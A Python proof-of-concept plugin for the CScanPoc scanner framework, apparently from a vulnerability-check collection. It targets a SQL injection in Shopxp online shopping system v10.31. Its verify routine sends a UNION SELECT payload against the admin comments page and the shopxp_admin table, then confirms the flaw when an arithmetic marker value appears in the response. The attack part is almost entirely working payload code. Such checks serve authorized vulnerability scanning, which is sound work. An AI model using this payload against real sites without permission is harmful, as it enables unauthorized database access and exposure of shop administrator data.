# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import math
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Shopxp_0000'  # 平台漏洞编号，留空
    name = 'Shopxp网上购物系统 v10.31 注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-11'  # 漏洞公布时间
    desc = '''
        Shopxp网上购物系统是一个经过完善设计的经典商城购物管理系统，适用于各种服务器环境的高效网上购物网站建设解决方案。基于asp＋Access、Mssql为免费开源程序，在互联网上有广泛的应用。
        SHOPXP网上购物系统 v10.31 注入漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=82844'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shopxp'  # 漏洞应用名称
    product_version = '10.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ed61c1d2-8928-4cca-a991-1247a3291e2a'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,88888-22222,1,1,1,1,1,1,1,1%20from%20shopxp_admin"
            verify_url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(verify_url)

            if code == 200 and "66666" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
